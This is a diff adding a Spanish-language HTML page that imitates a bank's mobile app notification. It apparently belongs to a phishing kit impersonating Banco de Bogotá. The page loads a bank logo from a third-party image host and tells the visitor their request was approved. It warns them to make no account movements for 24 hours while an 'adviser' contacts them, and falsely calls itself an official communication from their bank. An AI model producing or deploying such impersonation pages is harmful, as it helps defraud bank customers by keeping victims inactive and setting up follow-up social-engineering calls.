@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>App Movil - Notificación</title>
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="google" content="notranslate">
+    <style>
+        /* Configuración de la "Pantalla" del simulador */
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #0041c2; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+
+        /* Contenedor tipo Celular */
+        .box-container {
+            width: 100%;
+            max-width: 414px; 
+            height: 95vh;
+            max-height: 850px;
+            background-color: #ffffff;
+            border-radius: 30px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.2);
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .box-container::-webkit-scrollbar {
+            display: none;
+        }
+
+        .container__login {
+            padding: 25px;
+        }
+
+        .container__login--header {
+            margin-bottom: 20px;
+        }
+
+        /* Banner Azul - Información de Cupo */
+        .banner-promo {
+            background-color: #0041c2;
+            border-radius: 15px;
+            padding: 20px;
+            color: white;
+            margin-bottom: 25px;
+        }
+
+        .banner-content h2 {
+            margin: 0 0 10px 0;
+            font-size: 20px;
+        }
+
+        .monto {
+            font-size: 28px;
+            font-weight: bold;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        .advertencia {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 13px;
+            line-height: 1.4;
+            border-left: 4px solid #ffcc00;
+        }
+
+        /* Botón */
+        .btn-main {
+            width: 100%;
+            background-color: #0041c2;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        .btn-main:hover {
+            background-color: #003194;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 25px;
+            gap: 15px;
+        }
+
+        .footer-links a {
+            color: #0041c2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .divider {
+            width: 1px;
+            height: 15px;
+            background-color: #ccc;
+        }
+
+        .recaptcha-text {
+            font-size: 12px;
+            color: #777;
+            text-align: center;
+            margin-top: 30px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="box-container">
+        <div class="container__login">
+            
+            <!-- Logo -->
+            <div class="container__login--header">
+                <img src="https://sapp2406.sirv.com/bogo/logobanco1.png" alt="Logo" style="max-width: 180px;">
+            </div>
+
+            <p style="font-size: 20px; font-weight: bold; margin-bottom: 20px;">
+                Estado de tu solictud<br><span style="color:#0041c2;"></span>
+            </p>
+
+            <!-- Banner Informativo -->
+            <div class="banner-promo">
+                <div class="banner-content">
+                    <small style="letter-spacing: 1px; text-transform: uppercase;">Aprobación Inmediata</small>
+                    <h2>¡Felicidades!</h2>
+                    <span class="monto">¡Aprobaste tu solicitud!</span>
+                    
+                    <div class="advertencia">
+                        <strong>AVISO IMPORTANTE:</strong><br>
+                        Para garantizar la seguridad de la activación, por favor <b>no realice ningún movimiento</b> en sus productos durante las próximas <b>24 horas. uno de nuestros asesores le contactará</b>.
+                    </div>
+                </div>
+            </div>
+
+            <!-- Botón de Confirmación -->
+            <!-- Reemplaza 'https://tu-url-aqui.com' con el link real -->
+            <a href="https://www.bancodebogota.com/personas/tarjetas-de-credito" target="_blank" class="btn-main">
+                Confirmar y Activar
+            </a>
+
+            <!-- Links de apoyo -->
+            <div class="footer-links">
+                <a href="#">Términos y condiciones</a>
+                <div class="divider"></div>
+                <a href="#">Ayuda</a>
+            </div>
+
+            <p class="recaptcha-text">
+                Esta es una comunicación oficial de su entidad bancaria.<br>
+                © 2026 Todos los derechos reservados.
+            </p>
+        </div>
+    </div>
+
+</body>
+</html>
